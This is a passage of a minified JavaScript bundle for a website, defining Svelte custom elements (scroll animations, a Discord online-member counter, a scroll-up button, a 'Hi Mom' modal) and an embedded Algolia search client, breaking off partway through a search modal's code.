    (n.$$set = (d) => {
      "delay" in d && t(0, (r = d.delay)),
        "start" in d && t(1, (i = d.start)),
        "repeat" in d && t(4, (o = d.repeat));
    }),
    [
      r,
      i,
      a,
      l,
      o,
      function c(d) {
        st[d ? "unshift" : "push"](() => {
          (a = d), t(2, a);
        });
      },
    ]
  );
}
customElements.define("img-reveal", Em);
class Cm extends K {
  constructor(e) {
    super(),
      (this.shadowRoot.innerHTML =
        "<style>@media(prefers-reduced-motion: no-preference){.top{transform:translateY(-20px);filter:hue-rotate(90deg);opacity:0;position:relative;transition-property:all;transition-timing-function:cubic-bezier(0.4, 0, 0.2, 1);transition-duration:500ms}.right{transform:translateX(-20px);filter:hue-rotate(90deg);opacity:0;position:relative;transition-property:all;transition-timing-function:cubic-bezier(0.4, 0, 0.2, 1);transition-duration:500ms}.visible{transform:translateX(0);filter:hue-rotate(0);opacity:1}}</style>"),
      J(
        this,
        {
          target: this.shadowRoot,
          props: Y(this.attributes),
          customElement: !0,
        },
        Sm,
        Tm,
        G,
        { delay: 0, start: 1, repeat: 4 },
        null
      ),
      e &&
        (e.target && p(e.target, this, e.anchor),
        e.props && (this.$set(e.props), W()));
  }
  static get observedAttributes() {
    return ["delay", "start", "repeat"];
  }
  get delay() {
    return this.$$.ctx[0];
  }
  set delay(e) {
    this.$$set({ delay: e }), W();
  }
  get start() {
    return this.$$.ctx[1];
  }
  set start(e) {
    this.$$set({ start: e }), W();
  }
  get repeat() {
    return this.$$.ctx[4];
  }
  set repeat(e) {
    this.$$set({ repeat: e }), W();
  }
}
function Io(n) {
  let e,
    t,
    r,
    o,
    s,
    i = n[0].presence_count + "";
  return {
    c() {
      (e = b("span")),
        (e.innerHTML =
          '<span class="outer"></span> \n            <span class="inner"></span>'),
        (t = E()),
        (r = b("span")),
        (o = A(i)),
        (s = A(" members online")),
        w(e, "class", "ping"),
        w(r, "class", "num");
    },
    m(a, l) {
      p(a, e, l), p(a, t, l), p(a, r, l), h(r, o), p(a, s, l);
    },
    p(a, l) {
      1 & l && i !== (i = a[0].presence_count + "") && U(o, i);
    },
    d(a) {
      a && g(e), a && g(t), a && g(r), a && g(s);
    },
  };
}
function Am(n) {
  let e,
    t = n[0] && Io(n);
  return {
    c() {
      t && t.c(), (e = ee()), (this.c = k);
    },
    m(r, i) {
      t && t.m(r, i), p(r, e, i);
    },
    p(r, [i]) {
      r[0]
        ? t
          ? t.p(r, i)
          : ((t = Io(r)), t.c(), t.m(e.parentNode, e))
        : t && (t.d(1), (t = null));
    },
    i: k,
    o: k,
    d(r) {
      t && t.d(r), r && g(e);
    },
  };
}
function Rm(n, e, t) {
  let r;
  return (
    bt(async () => {
      let i = await fetch(
        "https://discord.com/api/guilds/1015095797689360444/widget.json"
      );
      t(0, (r = await i.json()));
    }),
    [r]
  );
}
customElements.define("scroll-show", Cm);
class Pm extends K {
  constructor(e) {
    super(),
      (this.shadowRoot.innerHTML =
        "<style>.ping{position:relative;display:inline-flex;height:0.75rem;width:0.75rem\n}.outer{position:absolute;display:inline-flex;height:100%;width:100%\n}@keyframes ping{75%,100%{transform:scale(2);opacity:0\n    }}.outer{animation:ping 1s cubic-bezier(0, 0, 0.2, 1) infinite;border-radius:9999px;--tw-bg-opacity:1;background-color:rgb(74 222 128 / var(--tw-bg-opacity));opacity:0.75\n}.inner{position:relative;display:inline-flex;height:0.75rem;width:0.75rem;border-radius:9999px;--tw-bg-opacity:1;background-color:rgb(34 197 94 / var(--tw-bg-opacity))\n}.num{font-family:cubano, sans-serif;font-size:1.125rem;line-height:1.75rem;--tw-text-opacity:1;color:rgb(34 197 94 / var(--tw-text-opacity))\n}</style>"),
      J(
        this,
        {
          target: this.shadowRoot,
          props: Y(this.attributes),
          customElement: !0,
        },
        Rm,
        Am,
        G,
        {},
        null
      ),
      e && e.target && p(e.target, this, e.anchor);
  }
}
customElements.define("discord-count", Pm);
const { window: xm } = As;
function Om(n) {
  let e, t, r;
  return {
    c() {
      (e = b("button")),
        (e.innerHTML =
          '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 384 512"><path fill="currentColor" d="M214.6 41.4c-12.5-12.5-32.8-12.5-45.3 0l-160 160c-12.5 12.5-12.5 32.8 0 45.3s32.8 12.5 45.3 0L160 141.2V448c0 17.7 14.3 32 32 32s32-14.3 32-32V141.2L329.4 246.6c12.5 12.5 32.8 12.5 45.3 0s12.5-32.8 0-45.3l-160-160z"></path></svg>'),
        (this.c = k),
        Z(e, "show", n[0]);
    },
    m(i, o) {
      p(i, e, o),
        t || ((r = [O(xm, "scroll", n[1]), O(e, "click", Lm)]), (t = !0));
    },
    p(i, [o]) {
      1 & o && Z(e, "show", i[0]);
    },
    i: k,
    o: k,
    d(i) {
      i && g(e), (t = !1), fe(r);
    },
  };
}
function Lm() {
  window.scrollTo({ top: 0, behavior: "smooth" });
}
function Nm(n, e, t) {
  let r = !1;
  function i() {
    t(0, (r = window.scrollY > 250));
  }
  return (
    bt(() => () => {
      window.removeEventListener("scroll", i);
    }),
    [r, i]
  );
}
class Mm extends K {
  constructor(e) {
    super(),
      (this.shadowRoot.innerHTML =
        "<style>button{position:fixed;bottom:1.25rem;right:1.25rem;display:grid;height:2.5rem;width:2.5rem;--tw-translate-y:2rem;transform:translate(var(--tw-translate-x), var(--tw-translate-y)) rotate(var(--tw-rotate)) skewX(var(--tw-skew-x)) skewY(var(--tw-skew-y)) scaleX(var(--tw-scale-x)) scaleY(var(--tw-scale-y));cursor:pointer;place-items:center;border-radius:9999px;border-style:none;background-color:rgb(0 0 0 / var(--tw-bg-opacity));--tw-bg-opacity:0.5;padding:0px;--tw-text-opacity:1;color:rgb(108 121 131 / var(--tw-text-opacity));opacity:0;outline:2px solid transparent;outline-offset:2px;transition-property:all;transition-timing-function:cubic-bezier(0.4, 0, 0.2, 1);transition-duration:150ms\n}button:hover{--tw-text-opacity:1;color:rgb(249 115 22 / var(--tw-text-opacity))\n}button svg{height:1.25rem;width:1.25rem\n}.show{--tw-translate-y:0px;transform:translate(var(--tw-translate-x), var(--tw-translate-y)) rotate(var(--tw-rotate)) skewX(var(--tw-skew-x)) skewY(var(--tw-skew-y)) scaleX(var(--tw-scale-x)) scaleY(var(--tw-scale-y));opacity:1\n}</style>"),
      J(
        this,
        {
          target: this.shadowRoot,
          props: Y(this.attributes),
          customElement: !0,
        },
        Nm,
        Om,
        G,
        {},
        null
      ),
      e && e.target && p(e.target, this, e.anchor);
  }
}
function Dm(n) {
  let e;
  return {
    c() {
      (e = b("modal-dialog")),
        (e.innerHTML =
          '<h1>Hi Mom!</h1> \n    <img src="/img/himom.gif" alt="hi mom"/>'),
        (this.c = k),
        Te(e, "name", "himom"),
        Te(e, "esc", "true");
    },
    m(t, r) {
      p(t, e, r);
    },
    p: k,
    i: k,
    o: k,
    d(t) {
      t && g(e);
    },
  };
}
customElements.define("scroll-up", Mm);
class Um extends K {
  constructor(e) {
    super(),
      (this.shadowRoot.innerHTML =
        "<style>h1{text-align:center;font-family:cubano, sans-serif;font-size:4.5rem;line-height:1;font-weight:400;--tw-text-opacity:1;color:rgb(236 72 153 / var(--tw-text-opacity))\n}img{margin-left:auto;margin-right:auto;width:16rem\n}</style>"),
      J(
        this,
        {
          target: this.shadowRoot,
          props: Y(this.attributes),
          customElement: !0,
        },
        null,
        Dm,
        G,
        {},
        null
      ),
      e && e.target && p(e.target, this, e.anchor);
  }
}
customElements.define("hi-mom", Um);
var Fm =
  typeof globalThis < "u"
    ? globalThis
    : typeof window < "u"
    ? window
    : typeof global < "u"
    ? global
    : typeof self < "u"
    ? self
    : {};
function Kg(n) {
  return n && n.__esModule && Object.prototype.hasOwnProperty.call(n, "default")
    ? n.default
    : n;
}
var Ka = { exports: {} };
Ka.exports = (function () {
  function t(T, S, C) {
    return (
      S in T
        ? Object.defineProperty(T, S, {
            value: C,
            enumerable: !0,
            configurable: !0,
            writable: !0,
          })
        : (T[S] = C),
      T
    );
  }
  function r(T, S) {
    var C = Object.keys(T);
    if (Object.getOwnPropertySymbols) {
      var x = Object.getOwnPropertySymbols(T);
      S &&
        (x = x.filter(function (N) {
          return Object.getOwnPropertyDescriptor(T, N).enumerable;
        })),
        C.push.apply(C, x);
    }
    return C;
  }
  function i(T) {
    for (var S = 1; S < arguments.length; S++) {
      var C = null != arguments[S] ? arguments[S] : {};
      S % 2
        ? r(Object(C), !0).forEach(function (x) {
            t(T, x, C[x]);
          })
        : Object.getOwnPropertyDescriptors
        ? Object.defineProperties(T, Object.getOwnPropertyDescriptors(C))
        : r(Object(C)).forEach(function (x) {
            Object.defineProperty(T, x, Object.getOwnPropertyDescriptor(C, x));
          });
    }
    return T;
  }
  function o(T, S) {
    if (null == T) return {};
    var C,
      x,
      N = (function (V, $) {
        if (null == V) return {};
        var ae,
          ce,
          we = {},
          Ce = Object.keys(V);
        for (ce = 0; ce < Ce.length; ce++)
          (ae = Ce[ce]), $.indexOf(ae) >= 0 || (we[ae] = V[ae]);
        return we;
      })(T, S);
    if (Object.getOwnPropertySymbols) {
      var j = Object.getOwnPropertySymbols(T);
      for (x = 0; x < j.length; x++)
        (C = j[x]),
          S.indexOf(C) >= 0 ||
            (Object.prototype.propertyIsEnumerable.call(T, C) && (N[C] = T[C]));
    }
    return N;
  }
  function s(T, S) {
    return (
      (function (C) {
        if (Array.isArray(C)) return C;
      })(T) ||
      (function (C, x) {
        if (
          Symbol.iterator in Object(C) ||
          "[object Arguments]" === Object.prototype.toString.call(C)
        ) {
          var N = [],
            j = !0,
            V = !1,
            $ = void 0;
          try {
            for (
              var ae, ce = C[Symbol.iterator]();
              !(j = (ae = ce.next()).done) &&
              (N.push(ae.value), !x || N.length !== x);
              j = !0
            );
          } catch (we) {
            (V = !0), ($ = we);
          } finally {
            try {
              j || null == ce.return || ce.return();
            } finally {
              if (V) throw $;
            }
          }
          return N;
        }
      })(T, S) ||
      (function () {
        throw new TypeError(
          "Invalid attempt to destructure non-iterable instance"
        );
      })()
    );
  }
  function a(T) {
    return (
      (function (S) {
        if (Array.isArray(S)) {
          for (var C = 0, x = new Array(S.length); C < S.length; C++)
            x[C] = S[C];
          return x;
        }
      })(T) ||
      (function (S) {
        if (
          Symbol.iterator in Object(S) ||
          "[object Arguments]" === Object.prototype.toString.call(S)
        )
          return Array.from(S);
      })(T) ||
      (function () {
        throw new TypeError("Invalid attempt to spread non-iterable instance");
      })()
    );
  }
  function l(T) {
    var S,
      C = "algoliasearch-client-js-".concat(T.key),
      x = function () {
        return void 0 === S && (S = T.localStorage || window.localStorage), S;
      },
      N = function () {
        return JSON.parse(x().getItem(C) || "{}");
      };
    return {
      get: function (j, V) {
        var $ =
          arguments.length > 2 && void 0 !== arguments[2]
            ? arguments[2]
            : {
                miss: function () {
                  return Promise.resolve();
                },
              };
        return Promise.resolve()
          .then(function () {
            var ae = JSON.stringify(j),
              ce = N()[ae];
            return Promise.all([ce || V(), void 0 !== ce]);
          })
          .then(function (ae) {
            var ce = s(ae, 2),
              we = ce[0],
              Ce = ce[1];
            return Promise.all([we, Ce || $.miss(we)]);
          })
          .then(function (ae) {
            return s(ae, 1)[0];
          });
      },
      set: function (j, V) {
        return Promise.resolve().then(function () {
          var $ = N();
          return (
            ($[JSON.stringify(j)] = V), x().setItem(C, JSON.stringify($)), V
          );
        });
      },
      delete: function (j) {
        return Promise.resolve().then(function () {
          var V = N();
          delete V[JSON.stringify(j)], x().setItem(C, JSON.stringify(V));
        });
      },
      clear: function () {
        return Promise.resolve().then(function () {
          x().removeItem(C);
        });
      },
    };
  }
  function c(T) {
    var S = a(T.caches),
      C = S.shift();
    return void 0 === C
      ? {
          get: function (x, N) {
            var j =
              arguments.length > 2 && void 0 !== arguments[2]
                ? arguments[2]
                : {
                    miss: function () {
                      return Promise.resolve();
                    },
                  };
            return N()
              .then(function ($) {
                return Promise.all([$, j.miss($)]);
              })
              .then(function ($) {
                return s($, 1)[0];
              });
          },
          set: function (x, N) {
            return Promise.resolve(N);
          },
          delete: function (x) {
            return Promise.resolve();
          },
          clear: function () {
            return Promise.resolve();
          },
        }
      : {
          get: function (x, N) {
            var j =
              arguments.length > 2 && void 0 !== arguments[2]
                ? arguments[2]
                : {
                    miss: function () {
                      return Promise.resolve();
                    },
                  };
            return C.get(x, N, j).catch(function () {
              return c({ caches: S }).get(x, N, j);
            });
          },
          set: function (x, N) {
            return C.set(x, N).catch(function () {
              return c({ caches: S }).set(x, N);
            });
          },
          delete: function (x) {
            return C.delete(x).catch(function () {
              return c({ caches: S }).delete(x);
            });
          },
          clear: function () {
            return C.clear().catch(function () {
              return c({ caches: S }).clear();
            });
          },
        };
  }
  function d() {
    var T =
        arguments.length > 0 && void 0 !== arguments[0]
          ? arguments[0]
          : { serializable: !0 },
      S = {};
    return {
      get: function (C, x) {
        var N =
            arguments.length > 2 && void 0 !== arguments[2]
              ? arguments[2]
              : {
                  miss: function () {
                    return Promise.resolve();
                  },
                },
          j = JSON.stringify(C);
        if (j in S)
          return Promise.resolve(T.serializable ? JSON.parse(S[j]) : S[j]);
        var V = x(),
          $ =
            (N && N.miss) ||
            function () {
              return Promise.resolve();
            };
        return V.then(function (ae) {
          return $(ae);
        }).then(function () {
          return V;
        });
      },
      set: function (C, x) {
        return (
          (S[JSON.stringify(C)] = T.serializable ? JSON.stringify(x) : x),
          Promise.resolve(x)
        );
      },
      delete: function (C) {
        return delete S[JSON.stringify(C)], Promise.resolve();
      },
      clear: function () {
        return (S = {}), Promise.resolve();
      },
    };
  }
  function u(T) {
    for (var S = T.length - 1; S > 0; S--) {
      var C = Math.floor(Math.random() * (S + 1)),
        x = T[S];
      (T[S] = T[C]), (T[C] = x);
    }
    return T;
  }
  function f(T, S) {
    return (
      S &&
        Object.keys(S).forEach(function (C) {
          T[C] = S[C](T);
        }),
      T
    );
  }
  function m(T) {
    for (
      var S = arguments.length, C = new Array(S > 1 ? S - 1 : 0), x = 1;
      x < S;
      x++
    )
      C[x - 1] = arguments[x];
    var N = 0;
    return T.replace(/%s/g, function () {
      return encodeURIComponent(C[N++]);
    });
  }
  var y = { WithinQueryParameters: 0, WithinHeaders: 1 };
  function I(T, S) {
    var C = T || {},
      x = C.data || {};
    return (
      Object.keys(C).forEach(function (N) {
        -1 ===
          [
            "timeout",
            "headers",
            "queryParameters",
            "data",
            "cacheable",
          ].indexOf(N) && (x[N] = C[N]);
      }),
      {
        data: Object.entries(x).length > 0 ? x : void 0,
        timeout: C.timeout || S,
        headers: C.headers || {},
        queryParameters: C.queryParameters || {},
        cacheable: C.cacheable,
      }
    );
  }
  var v = { Read: 1, Write: 2, Any: 3 },
    R = 1,
    L = 2,
    _ = 3;
  function P(T) {
    var S = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : R;
    return i(i({}, T), {}, { status: S, lastUpdate: Date.now() });
  }
  function te(T) {
    return "string" == typeof T
      ? { protocol: "https", url: T, accept: v.Any }
      : {
          protocol: T.protocol || "https",
          url: T.url,
          accept: T.accept || v.Any,
        };
  }
  var ne = "GET",
    D = "POST";
  function z(T, S) {
    return Promise.all(
      S.map(function (C) {
        return T.get(C, function () {
          return Promise.resolve(P(C));
        });
      })
    ).then(function (C) {
      var x = C.filter(function (V) {
          return ($ = V).status === R || Date.now() - $.lastUpdate > 12e4;
          var $;
        }),
        N = C.filter(function (V) {
          return ($ = V).status === _ && Date.now() - $.lastUpdate <= 12e4;
          var $;
        }),
        j = [].concat(a(x), a(N));
      return {
        getTimeout: function (V, $) {
          return (0 === N.length && 0 === V ? 1 : N.length + 3 + V) * $;
        },
        statelessHosts:
          j.length > 0
            ? j.map(function (V) {
                return te(V);
              })
            : S,
      };
    });
  }
  function B(T, S, C, x) {
    var Ne,
      le,
      ye,
      N = [],
      j = (function (_e, Ne) {
        if (_e.method !== ne && (void 0 !== _e.data || void 0 !== Ne.data)) {
          var le = Array.isArray(_e.data)
            ? _e.data
            : i(i({}, _e.data), Ne.data);
          return JSON.stringify(le);
        }
      })(C, x),
      V =
        ((Ne = x),
        (le = i(i({}, T.headers), Ne.headers)),
        (ye = {}),
        Object.keys(le).forEach(function (Ve) {
          var xe = le[Ve];
          ye[Ve.toLowerCase()] = xe;
        }),
        ye),
      $ = C.method,
      ae = C.method !== ne ? {} : i(i({}, C.data), x.data),
      ce = i(
        i(i({ "x-algolia-agent": T.userAgent.value }, T.queryParameters), ae),
        x.queryParameters
      ),
      we = 0,
      Ce = function _e(Ne, le) {
        var ye = Ne.pop();
        if (void 0 === ye)
          throw {
            name: "RetryError",
            message:
              "Unreachable hosts - your application id may be incorrect. If the error persists, contact support@algolia.com.",
            transporterStackTrace: X(N),
          };
        var Ve = {
            data: j,
            headers: V,
            method: $,
            url: H(ye, C.path, ce),
            connectTimeout: le(we, T.timeouts.connect),
            responseTimeout: le(we, x.timeout),
          },
          xe = function (he) {
            var se = {
              request: Ve,
              response: he,
              host: ye,
              triesLeft: Ne.length,
            };
            return N.push(se), se;
          },
          sn = {
            onSuccess: function (he) {
              return (function (se) {
                try {
                  return JSON.parse(se.content);
                } catch (Me) {
                  throw {
                    name: "DeserializationError",
                    message: Me.message,
                    response: se,
                  };
                }
              })(he);
            },
            onRetry: function (he) {
              var se = xe(he);
              return (
                he.isTimedOut && we++,
                Promise.all([
                  T.logger.info("Retryable failure", re(se)),
                  T.hostsCache.set(ye, P(ye, he.isTimedOut ? _ : L)),
                ]).then(function () {
                  return _e(Ne, le);
                })
              );
            },
            onFail: function (he) {
              throw (
                (xe(he),
                (function (se, Me) {
                  var Ze = se.content,
                    It = se.status,
                    Ft = Ze;
                  try {
                    Ft = JSON.parse(Ze).message;
                  } catch {}
                  return {
                    name: "ApiError",
                    message: Ft,
                    status: It,
                    transporterStackTrace: Me,
                  };
                })(he, X(N)))
              );
            },
          };
        return T.requester.send(Ve).then(function (he) {
          return (
            (Me = sn),
            (It = (Ze = se = he).status),
            Ze.isTimedOut ||
            ((an = (Ft = Ze).isTimedOut), (Hn = Ft.status), !an && 0 == ~~Hn) ||
            (2 != ~~(It / 100) && 4 != ~~(It / 100))
              ? Me.onRetry(se)
              : 2 == ~~(se.status / 100)
              ? Me.onSuccess(se)
              : Me.onFail(se)
          );
          var se, Me, Ze, Ft, an, Hn, It;
        });
      };
    return z(T.hostsCache, S).then(function (_e) {
      return Ce(a(_e.statelessHosts).reverse(), _e.getTimeout);
    });
  }
  function q(T) {
    var S = {
      value: "Algolia for JavaScript (".concat(T, ")"),
      add: function (C) {
        var x = "; "
          .concat(C.segment)
          .concat(void 0 !== C.version ? " (".concat(C.version, ")") : "");
        return (
          -1 === S.value.indexOf(x) && (S.value = "".concat(S.value).concat(x)),
          S
        );
      },
    };
    return S;
  }
  function H(T, S, C) {
    var x = M(C),
      N = ""
        .concat(T.protocol, "://")
        .concat(T.url, "/")
        .concat("/" === S.charAt(0) ? S.substr(1) : S);
    return x.length && (N += "?".concat(x)), N;
  }
  function M(T) {
    return Object.keys(T)
      .map(function (S) {
        return m(
          "%s=%s",
          S,
          ((C = T[S]),
          "[object Object]" === Object.prototype.toString.call(C) ||
          "[object Array]" === Object.prototype.toString.call(C)
            ? JSON.stringify(T[S])
            : T[S])
        );
        var C;
      })
      .join("&");
  }
  function X(T) {
    return T.map(function (S) {
      return re(S);
    });
  }
  function re(T) {
    var S = T.request.headers["x-algolia-api-key"]
      ? { "x-algolia-api-key": "*****" }
      : {};
    return i(
      i({}, T),
      {},
      {
        request: i(
          i({}, T.request),
          {},
          { headers: i(i({}, T.request.headers), S) }
        ),
      }
    );
  }
  var ue = function (T) {
      var N,
        j,
        V,
        $,
        S = T.appId,
        C =
          ((N = void 0 !== T.authMode ? T.authMode : y.WithinHeaders),
          (j = S),
          (V = T.apiKey),
          ($ = { "x-algolia-api-key": V, "x-algolia-application-id": j }),
          {
            headers: function () {
              return N === y.WithinHeaders ? $ : {};
            },
            queryParameters: function () {
              return N === y.WithinQueryParameters ? $ : {};
            },
          }),
        x = (function (N) {
          var j = N.hostsCache,
            V = N.logger,
            $ = N.requester,
            ae = N.requestsCache,
            ce = N.responsesCache,
            we = N.timeouts,
            Ce = N.userAgent,
            _e = N.hosts,
            Ne = N.queryParameters,
            le = {
              hostsCache: j,
              logger: V,
              requester: $,
              requestsCache: ae,
              responsesCache: ce,
              timeouts: we,
              userAgent: Ce,
              headers: N.headers,
              queryParameters: Ne,
              hosts: _e.map(function (ye) {
                return te(ye);
              }),
              read: function (ye, Ve) {
                var xe = I(Ve, le.timeouts.read),
                  sn = function () {
                    return B(
                      le,
                      le.hosts.filter(function (se) {
                        return 0 != (se.accept & v.Read);
                      }),
                      ye,
                      xe
                    );
                  };
                if (
                  !0 !== (void 0 !== xe.cacheable ? xe.cacheable : ye.cacheable)
                )
                  return sn();
                var he = {
                  request: ye,
                  mappedRequestOptions: xe,
                  transporter: {
                    queryParameters: le.queryParameters,
                    headers: le.headers,
                  },
                };
                return le.responsesCache.get(
                  he,
                  function () {
                    return le.requestsCache.get(he, function () {
                      return le.requestsCache
                        .set(he, sn())
                        .then(
                          function (se) {
                            return Promise.all([
                              le.requestsCache.delete(he),
                              se,
                            ]);
                          },
                          function (se) {
                            return Promise.all([
                              le.requestsCache.delete(he),
                              Promise.reject(se),
                            ]);
                          }
                        )
                        .then(function (se) {
                          var Me = s(se, 2);
                          return Me[0], Me[1];
                        });
                    });
                  },
                  {
                    miss: function (se) {
                      return le.responsesCache.set(he, se);
                    },
                  }
                );
              },
              write: function (ye, Ve) {
                return B(
                  le,
                  le.hosts.filter(function (xe) {
                    return 0 != (xe.accept & v.Write);
                  }),
                  ye,
                  I(Ve, le.timeouts.write)
                );
              },
            };
          return le;
        })(
          i(
            i(
              {
                hosts: [
                  { url: "".concat(S, "-dsn.algolia.net"), accept: v.Read },
                  { url: "".concat(S, ".algolia.net"), accept: v.Write },
                ].concat(
                  u([
                    { url: "".concat(S, "-1.algolianet.com") },
                    { url: "".concat(S, "-2.algolianet.com") },
                    { url: "".concat(S, "-3.algolianet.com") },
                  ])
                ),
              },
              T
            ),
            {},
            {
              headers: i(
                i(i({}, C.headers()), {
                  "content-type": "application/x-www-form-urlencoded",
                }),
                T.headers
              ),
              queryParameters: i(i({}, C.queryParameters()), T.queryParameters),
            }
          )
        );
      return f(
        {
          transporter: x,
          appId: S,
          addAlgoliaAgent: function (N, j) {
            x.userAgent.add({ segment: N, version: j });
          },
          clearCache: function () {
            return Promise.all([
              x.requestsCache.clear(),
              x.responsesCache.clear(),
            ]).then(function () {});
          },
        },
        T.methods
      );
    },
    be = function (T) {
      return function (S, C) {
        return S.method === ne
          ? T.transporter.read(S, C)
          : T.transporter.write(S, C);
      };
    },
    Be = function (T) {
      return function (S) {
        var C =
          arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : {};
        return f(
          { transporter: T.transporter, appId: T.appId, indexName: S },
          C.methods
        );
      };
    },
    ke = function (T) {
      return function (S, C) {
        var x = S.map(function (N) {
          return i(i({}, N), {}, { params: M(N.params || {}) });
        });
        return T.transporter.read(
          {
            method: D,
            path: "1/indexes/*/queries",
            data: { requests: x },
            cacheable: !0,
          },
          C
        );
      };
    },
    yt = function (T) {
      return function (S, C) {
        return Promise.all(
          S.map(function (x) {
            var N = x.params,
              j = N.facetName,
              V = N.facetQuery,
              $ = o(N, ["facetName", "facetQuery"]);
            return Be(T)(x.indexName, {
              methods: { searchForFacetValues: kt },
            }).searchForFacetValues(j, V, i(i({}, C), $));
          })
        );
      };
    },
    vt = function (T) {
      return function (S, C, x) {
        return T.transporter.read(
          {
            method: D,
            path: m("1/answers/%s/prediction", T.indexName),
            data: { query: S, queryLanguages: C },
            cacheable: !0,
          },
          x
        );
      };
    },
    Ut = function (T) {
      return function (S, C) {
        return T.transporter.read(
          {
            method: D,
            path: m("1/indexes/%s/query", T.indexName),
            data: { query: S },
            cacheable: !0,
          },
          C
        );
      };
    },
    kt = function (T) {
      return function (S, C, x) {
        return T.transporter.read(
          {
            method: D,
            path: m("1/indexes/%s/facets/%s/query", T.indexName, S),
            data: { facetQuery: C },
            cacheable: !0,
          },
          x
        );
      };
    },
    on = 1,
    Ie = 2,
    Q = 3;
  function pe(T, S, C) {
    var x,
      N = {
        appId: T,
        apiKey: S,
        timeouts: { connect: 1, read: 2, write: 30 },
        requester: {
          send: function (j) {
            return new Promise(function (V) {
              var $ = new XMLHttpRequest();
              $.open(j.method, j.url, !0),
                Object.keys(j.headers).forEach(function (Ce) {
                  return $.setRequestHeader(Ce, j.headers[Ce]);
                });
              var ae,
                ce = function (Ce, _e) {
                  return setTimeout(function () {
                    $.abort(), V({ status: 0, content: _e, isTimedOut: !0 });
                  }, 1e3 * Ce);
                },
                we = ce(j.connectTimeout, "Connection timeout");
              ($.onreadystatechange = function () {
                $.readyState > $.OPENED &&
                  void 0 === ae &&
                  (clearTimeout(we),
                  (ae = ce(j.responseTimeout, "Socket timeout")));
              }),
                ($.onerror = function () {
                  0 === $.status &&
                    (clearTimeout(we),
                    clearTimeout(ae),
                    V({
                      content: $.responseText || "Network request failed",
                      status: $.status,
                      isTimedOut: !1,
                    }));
                }),
                ($.onload = function () {
                  clearTimeout(we),
                    clearTimeout(ae),
                    V({
                      content: $.responseText,
                      status: $.status,
                      isTimedOut: !1,
                    });
                }),
                $.send(j.data);
            });
          },
        },
        logger:
          ((x = Q),
          {
            debug: function (j, V) {
              return on >= x && console.debug(j, V), Promise.resolve();
            },
            info: function (j, V) {
              return Ie >= x && console.info(j, V), Promise.resolve();
            },
            error: function (j, V) {
              return console.error(j, V), Promise.resolve();
            },
          }),
        responsesCache: d(),
        requestsCache: d({ serializable: !1 }),
        hostsCache: c({
          caches: [l({ key: "".concat("4.14.2", "-").concat(T) }), d()],
        }),
        userAgent: q("4.14.2").add({ segment: "Browser", version: "lite" }),
        authMode: y.WithinQueryParameters,
      };
    return ue(
      i(
        i(i({}, N), C),
        {},
        {
          methods: {
            search: ke,
            searchForFacetValues: yt,
            multipleQueries: ke,
            multipleSearchForFacetValues: yt,
            customRequest: be,
            initIndex: function (j) {
              return function (V) {
                return Be(j)(V, {
                  methods: {
                    search: Ut,
                    searchForFacetValues: kt,
                    findAnswers: vt,
                  },
                });
              };
            },
          },
        }
      )
    );
  }
  return (pe.version = "4.14.2"), pe;
})();
const Hm = Ka.exports,
  { window: jm } = As;
function Eo(n, e, t) {
  const r = n.slice();
  return (r[16] = e[t]), (r[18] = t), r;
}
function To(n) {
  let e, t, r;
  return {
    c() {
      (e = b("input")),
        w(e, "class", "input"),
        w(e, "name", "search"),
        w(e, "type", "text"),
        w(e, "placeholder", "Search");
    },
    m(i, o) {
      p(i, e, o), n[10](e), t || ((r = O(e, "input", n[5])), (t = !0));
    },
    p: k,
    d(i) {
      i && g(e), n[10](null), (t = !1), r();
    },
  };
}
function So(n) {
  let e;
  return {
    c() {
      (e = b("p")),
        (e.textContent = "No results yet"),
        w(e, "class", "no-results");
    },
    m(t, r) {
      p(t, e, r);
    },
    d(t) {
      t && g(e);
    },
  };
}
function Co(n) {
  let e,
    t,
    i,
    o,
    s,
    a,
    c,
    d,
    u,
    m,
    y,
    I,
    v,
    r = n[16].title + "",
    l = n[16].type + "",
    f = n[16]._snippetResult.summary.value + "";
  function R() {
    return n[11](n[18]);
  }
  function L() {
    return n[12](n[18]);
  }
  return {
    c() {
      (e = b("a")),
        (t = b("span")),
        (i = A(r)),
        (o = E()),
        (s = b("span")),
        (a = A("in ")),
        (c = A(l)),
        (d = E()),
        (u = b("span")),
        (m = E()),
        w(t, "class", "hit-title"),
        w(s, "class", "hit-type"),
        w(u, "class", "hit-description"),
        w(e, "class", "hit"),
        w(e, "href", (y = n[16].relpermalink)),
        Z(e, "active", n[18] === n[3]);
    },
    m(_, P) {
      p(_, e, P),
        h(e, t),
        h(t, i),
        h(e, o),
        h(e, s),
        h(s, a),
        h(s, c),
        h(e, d),
        h(e, u),
        (u.innerHTML = f),
        h(e, m),
        I || ((v = [O(e, "mouseover", R), O(e, "focus", L)]), (I = !0));
    },
    p(_, P) {
      (n = _),
        4 & P && r !== (r = n[16].title + "") && U(i, r),
        4 & P && l !== (l = n[16].type + "") && U(c, l),
        4 & P &&
          f !== (f = n[16]._snippetResult.summary.value + "") &&
          (u.innerHTML = f),
        4 & P && y !== (y = n[16].relpermalink) && w(e, "href", y),
        8 & P && Z(e, "active", n[18] === n[3]);
    },
    d(_) {
      _ && g(e), (I = !1), fe(v);
    },
  };
}
function zm(n) {
  var H;
  let e,
    t,
    r,
    i,
    o,
    s,
    a,
    l,
    c,
    d,
    u,
    f,
    m,
    y,
    I,
    v,
    R,
    L,
    _,
    P,
    te,
    ne,
    D = "search" === n[4] && To(n),
    z = !(null != (H = n[1]) && H.nbHits) && So(),
    B = n[2],
    q = [];
  for (let M = 0; M < B.length; M += 1) q[M] = Co(Eo(n, B, M));
  return {
    c() {
      (e = b("modal-dialog")),
        (t = b("form")),
        D && D.c(),
        (r = E()),
        (i = b("div")),
        z && z.c(),
        (o = E());
      for (let M = 0; M < q.length; M += 1) q[M].c();
      (s = E()),
        (a = b("footer")),
        (l = b("kbd")),
        (l.textContent = "↩"),
        (c = E()),
        (d = b("span")),
        (d.textContent = "select"),
        (u = E()),
        (f = b("kbd")),
        (f.textContent = "↑"),
        (m = E()),
        (y = b("kbd")),
        (y.textContent = "↓"),
        (I = E()),
        (v = b("span")),
        (v.textContent = "navigate"),
        (R = E()),
        (L = b("kbd")),
        (L.textContent = "esc"),
        (_ = E()),
        (P = b("span")),
        (P.textContent = "leave"),
        (this.c = k),
        w(i, "class", "results"),
        w(d, "class", "kbd-text"),
        w(v, "class", "kbd-text"),
        w(P, "class", "kbd-text"),
        Te(e, "name", "search");
    },
    m(M, X) {
